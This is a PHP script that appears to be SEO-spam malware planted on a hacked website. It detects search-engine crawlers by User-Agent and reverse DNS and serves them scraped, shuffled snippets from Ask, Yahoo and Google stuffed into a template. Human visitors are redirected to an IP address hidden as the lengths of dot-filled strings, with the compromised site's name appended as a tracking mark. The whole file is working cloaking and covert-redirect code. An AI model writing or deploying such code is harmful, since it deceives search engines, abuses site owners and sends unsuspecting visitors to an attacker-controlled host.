<?php

$user_agent_to_filter = array( '#Ask\s*Jeeves#i', '#HP\s*Web\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\s*Library#',
                               '#ListChecker#i', '#MSIECrawler#i', '#NetCache#i', '#Nutch#i', '#RPT-HTTPClient#i',
                               '#rulinki\.ru#i', '#Twiceler#i', '#WebAlta#i', '#Webster\s*Pro#i','#www\.cys\.ru#i',
                               '#Wysigot#i', '#Yahoo!\s*Slurp#i', '#Yeti#i', '#Accoona#i', '#CazoodleBot#i',
                               '#CFNetwork#i', '#ConveraCrawler#i','#DISCo#i', '#Download\s*Master#i', '#FAST\s*MetaWeb\s*Crawler#i',
                               '#Flexum\s*spider#i', '#Gigabot#i', '#HTMLParser#i', '#ia_archiver#i', '#ichiro#i',
                               '#IRLbot#i', '#Java#i', '#km\.ru\s*bot#i', '#kmSearchBot#i', '#libwww-perl#i',
                               '#Lupa\.ru#i', '#LWP::Simple#i', '#lwp-trivial#i', '#Missigua#i', '#MJ12bot#i',
                               '#msnbot#i', '#msnbot-media#i', '#Offline\s*Explorer#i', '#OmniExplorer_Bot#i',
                               '#PEAR#i', '#psbot#i', '#Python#i', '#rulinki\.ru#i', '#SMILE#i',
                               '#Speedy#i', '#Teleport\s*Pro#i', '#TurtleScanner#i', '#User-Agent#i', '#voyager#i',
                               '#Webalta#i', '#WebCopier#i', '#WebData#i', '#WebZIP#i', '#Wget#i',
                               '#Yandex#i', '#Yanga#i', '#Yeti#i','#msnbot#i',
                               '#spider#i', '#yahoo#i', '#jeeves#i' ,'#google#i' ,'#altavista#i',
                               '#scooter#i' ,'#av\s*fetch#i' ,'#asterias#i' ,'#spiderthread revision#i' ,'#sqworm#i',
                               '#ask#i' ,'#lycos.spider#i' ,'#infoseek sidewinder#i' ,'#ultraseek#i' ,'#polybot#i',
                               '#webcrawler#i', '#robozill#i', '#gulliver#i', '#architextspider#i', '#yahoo!\s*slurp#i',
                               '#charlotte#i', '#ngb#i', '#BingBot#i' ) ;

if ( !empty( $_SERVER['HTTP_USER_AGENT'] ) && ( FALSE !== strpos( preg_replace( $user_agent_to_filter, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT'] ), '-NO-WAY-' ) ) ){
    $isbot = 1;
	}

if( FALSE !== strpos( gethostbyaddr($_SERVER['REMOTE_ADDR']), 'google'))
{
    $isbot = 1;
}

$adr1 = ".....................................";
$adr2 = ".";
$adr3 = "...................................................................................................................................................................................................................";
$adr4 = "..............................................................................................................................................................................................................";
$ard = strlen($adr1).".".strlen($adr2).".".strlen($adr3).".".strlen($adr4);

if ($isbot)
{

	$myname  = basename($_SERVER['SCRIPT_NAME'], ".php");
	if (file_exists($myname))
	{
	$html = file($myname);
	$html = implode($html, "");
	echo $html;
	exit;
	}

	//if (!strpos($_SERVER['HTTP_USER_AGENT'], "google")) exit;

	while($tpl == 0)
	{
$tpl_n = rand(1,9);
$tpl = @file("tpl$tpl_n.html");
	}

$keyword = " 24 avril outreau voitures
";
$keyword = chop($keyword);
$relink = "<UL></UL>";



 $query_pars = $keyword;
 $query_pars_2 = str_replace(" ", "+", chop($query_pars));

for ($page=1;$page<3;$page++)
{
 $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://www.ask.com/web?q=$query_pars_2&qsrc=11&adt=1&o=0&l=dir&page=$page");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.6) Gecko/20060928 Firefox/1.5.0.6');
$result = curl_exec($ch);
curl_close($ch);

$result = str_replace("\r\n", "", $result);
$result = str_replace("\n", "", $result);

		preg_match_all ("#web-result-description\">(.*)</p></div>#iU",$result,$m);
		foreach ($m[1] as $a) $text .= $a;

}


		 $mas1 = array("1", "2", "3", "4", "5");
	$mas2 = array("11-20", "21-30", "31-40", "41-50", "51-60");
	$setmktBing = "US";
	$lang = "US";


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://search.yahoo.com/search?p=$query_pars_2");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.6) Gecko/20060928 Firefox/1.5.0.6');
$result = curl_exec($ch);
curl_close($ch);
		preg_match_all ("#<p class=\"lh-17\">(.*)</p></div>#iU",$result,$m);
		foreach ($m[1] as $a) $text .= $a;

	//	echo $result;
	//	exit;

	sleep(1);

foreach ($mas1 as $var=>$key)
{
        $link = "";
	    preg_match_all ("#<strong>$key</strong><a href=\"(.*)\" title=\"Results $mas2[$var]\"#iU",$result,$mm);
        $link = str_replace('<strong>'.$key.'</strong><a href="', "", $mm[0][0]);
		$link = str_replace('" title="Results '.$mas2[$var].'"', "", $link);
		if (strlen($link)<5) continue;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "$link");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.6) Gecko/20060928 Firefox/1.5.0.6');
$result = curl_exec($ch);
curl_close($ch);
		preg_match_all ("#<p class=\"lh-17\">(.*)</p></div>#iU",$result,$m);
		foreach ($m[1] as $a) $text .= $a;

	sleep(1);
		}

		$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.google.com/search?q=$query_pars_2&num=100&newwindow=1&source=lnt&tbs=qdr:d&sa=X");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.6) Gecko/20060928 Firefox/1.5.0.6');
$result = curl_exec($ch);
curl_close($ch);

$result = str_replace("\r\n", "", $result);
$result = str_replace("\n", "", $result);

//echo $result;

		preg_match_all ("#<span class=\"st\">(.*)</span>#iU",$result,$m);
		foreach ($m[1] as $a) $text .= $a;

				$text = str_replace("...", "", $text);
		$text = strip_tags($text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);

		$text = explode(".", $text);

		shuffle($text);
		    $text = array_unique($text);
		$text = implode(". ", $text);

     	$html = implode ("\n", $tpl);
		$html = str_replace("[BKEYWORD]", $keyword, $html);
		$html = str_replace("[LINKS]", $relink, $html);
		$html = str_replace("[SNIPPETS]", $text, $html);

		$out = fopen($myname, "w");
		fwrite($out, $html);
		fclose($out);

		echo $html;

}	

if(!@$isbot)
{


$s = dirname($_SERVER['PHP_SELF']);
if ($s == '\\' | $s == '/') {$s = ('');}
$s = $_SERVER['SERVER_NAME'] . $s;

header("Location: http://$ard/input/?mark=20160506-$s");
//header("Location: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");
exit;
}

?>